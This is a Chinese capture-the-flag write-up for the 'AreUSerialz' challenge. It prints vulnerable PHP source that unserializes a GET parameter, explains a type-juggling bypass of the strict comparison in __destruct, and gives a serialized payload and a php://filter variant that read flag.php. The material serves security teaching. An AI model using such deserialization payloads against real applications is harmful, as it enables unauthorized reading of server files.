# [网鼎杯 2020 青龙组]AreUSerialz 1

- 开始代码审计

```php
 <?php

include("flag.php");
highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

- 根据代码审计的结果，需要以GET方式传入一个参数str，str的值是序列化字符串，内容为一个FileHandler对象，对象中有三个属性 `$op` ， `$filename` 和 `$content` ，对象在实例化时会执行一次 `__construct()` 方法，摧毁时会执行一次 `__destruct()` 方法，而 `__destruct()` 方法会执行其中的 `process()` 方法，当 `$op == '2'` 时，就可以通过 `file_get_contents()` 函数读取flag.php，其中 `__destruct()` 方法会对 `$op` 进行一次强比较，当 `$op === '2'` 时会将其赋值为 `'1'`，因此这里需要对 `$op` 赋值为数值2来绕过 `__destruct()` ，同时绕过 `process()` 方法的弱比较

- 注意此题的属性作用域为protected，在输出为序列化字符串中会出现不可打印的字符，因此改为public
 
```php
class FileHandler {
    public $op = 2;
    public $filename = '/var/www/html/flag.php';
    public $content = '';
}

$a = new FileHandler();
echo serialize($a);
```

`O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:22:"/var/www/html/flag.php";s:7:"content";s:0:"";}`

*注：这里的$filename也可以使用php://伪协议*

*$filename=php://filter/convert.base64-encode/resource=flag.php*

- 传入参数，在源码中得到flag

> <img src="../../IMG2/Screenshot 2024-06-04 191404.png">